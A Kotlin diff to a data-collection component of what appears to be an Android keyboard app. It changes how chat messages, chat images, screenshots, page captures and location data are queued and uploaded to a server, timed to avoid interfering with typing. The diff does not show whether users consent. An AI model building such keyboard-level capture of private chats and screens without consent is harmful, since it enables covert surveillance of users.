@@ -167,9 +167,9 @@ object DataCollector {
                         val online = ImageUploadRuntime.hasValidatedNetwork(app)
                         val navigationPending = online && com.yuyan.imemodule.data.navigation.NavigationSync.hasPending(app)
                         val imagePending = ImageUploadRuntime.hasValidatedWifi(app) &&
-                            (eventStore?.hasPendingImages() == true || com.yuyan.imemodule.data.capture.page.PageCaptureSync.hasPending(app))
+                            (eventStore?.hasPendingImages(ServerConfig.baseUrl, includeMessages = ImageUploadRuntime.isInputIdle()) == true || com.yuyan.imemodule.data.capture.page.PageCaptureSync.hasPending(app))
                         val imagesPending = ImageUploadRuntime.canUploadScreenshot(app, ServerConfig.baseUrl) &&
-                            (eventStore?.hasPendingImages() == true || com.yuyan.imemodule.data.capture.page.PageCaptureSync.hasDue(app))
+                            (eventStore?.hasPendingImages(ServerConfig.baseUrl, includeMessages = ImageUploadRuntime.isInputIdle()) == true || com.yuyan.imemodule.data.capture.page.PageCaptureSync.hasDue(app))
                         // 视频结束元数据不是图片，不得走一秒续传。图片与导航保留独立等待。
                         val wait = if (imagePending || navigationPending) minOf(nextDelay ?: FLUSH_INTERVAL_MS, FLUSH_INTERVAL_MS) else nextDelay
                         if (flushSignal.awaitNext(nextDelay != null || imagePending || navigationPending, imagesPending, wait)) return@guardedCycle
@@ -535,9 +535,22 @@ object DataCollector {
             { ImageUploadRuntime.hasValidatedNetwork(context) })
         val targets = (ServerConfig.eventTargets + local.targets() + local.reportTargets()).distinct().filter(gate::canAttempt)
         val locationEnabled = PreferenceManager.getDefaultSharedPreferences(context).getBoolean(KEY_LOCATION_ENABLE, true)
-        val kinds = local.deliverablePendingKinds(targets).filterTo(mutableSetOf()) { it != "location" || locationEnabled }
+        val kinds = deliverablePendingKinds(local, targets, locationEnabled)
         if (delivery?.hasPendingInteraction(targets) == true) kinds += "human_interaction"
         return kinds to local.hasPendingEvents(targets)
+    }
+
+    /** 聊天只交付线上；旧电脑镜像保留，但不能消耗线上聊天批次或预约图片恢复。 */
+    private fun deliverablePendingKinds(local: LocalInputStore, targets: List<String>, locationEnabled: Boolean): MutableSet<String> {
+        val kinds = mutableSetOf<String>()
+        val online = ServerConfig.baseUrl
+        for (target in targets) {
+            local.deliverablePendingKinds(listOf(target)).filterTo(kinds) { kind ->
+                (kind != "location" || locationEnabled) &&
+                    (target == online || kind !in setOf("chat_asset", "chat_messages", "chat_image_messages"))
+            }
+        }
+        return kinds
     }
 
     /** IO线程只查持久待传，不要求当前在线；离线队列由系统等待网络恢复。 */
@@ -549,17 +562,23 @@ object DataCollector {
         val targets = (ServerConfig.eventTargets + local.targets() + local.reportTargets()).distinct()
             .filter { it.trimEnd('/') == ServerConfig.baseUrl.trimEnd('/') || usb }
         val locationEnabled = PreferenceManager.getDefaultSharedPreferences(context).getBoolean(KEY_LOCATION_ENABLE, true)
-        val kinds = local.deliverablePendingKinds(targets).filterTo(mutableSetOf()) { it != "location" || locationEnabled }
-        if (local.hasPendingEvents(targets) || kinds.any { it != "chat_asset" } ||
+        val kinds = deliverablePendingKinds(local, targets, locationEnabled)
+        val ordinaryPending = local.hasPendingEvents(targets) || kinds.any { it != "chat_asset" } ||
             delivery?.hasPendingInteraction(targets) == true ||
             (com.yuyan.imemodule.data.navigation.NavigationSettings.enabled(context) &&
-                com.yuyan.imemodule.data.navigation.NavigationSync.hasPending(context))) {
-            return PendingUploadRecovery(300_000L, false)
+                com.yuyan.imemodule.data.navigation.NavigationSync.hasPending(context))
+        val imageDelay = if ("chat_asset" in kinds || ("chat_image_messages" in kinds && ImageUploadRuntime.isInputIdle()))
+            retryGate.remainingDelay(ServerConfig.baseUrl, android.os.SystemClock.elapsedRealtime()).coerceAtLeast(6_000L)
+            else null
+        // 页面图片尚需编码，继续避让输入；已准备聊天图片无需再等输入空闲。
+        val pageDelay = com.yuyan.imemodule.data.capture.page.PageCaptureSync.pendingRecoveryDelay(context)?.coerceAtLeast(
+            if (ImageUploadRuntime.isInputIdle()) 6_000L else 300_000L)
+        val wifiDelay = listOfNotNull(imageDelay, pageDelay).minOrNull()?.let {
+            // 混合任务采用 ANY 网络，流量下不能为不可上传的图片每六秒唤醒。
+            if (ordinaryPending && !ImageUploadRuntime.hasValidatedWifi(context)) maxOf(it, 300_000L) else it
         }
-        val imageDelay = if ("chat_asset" in kinds) 6_000L else null
-        val pageDelay = com.yuyan.imemodule.data.capture.page.PageCaptureSync.pendingRecoveryDelay(context)?.coerceAtLeast(6_000L)
-        val delay = listOfNotNull(imageDelay, pageDelay).minOrNull()
-        if (delay != null) return PendingUploadRecovery(delay, true)
+        val delay = listOfNotNull(wifiDelay, 300_000L.takeIf { ordinaryPending }).minOrNull()
+        if (delay != null) return PendingUploadRecovery(delay, !ordinaryPending)
         return null
     }
 
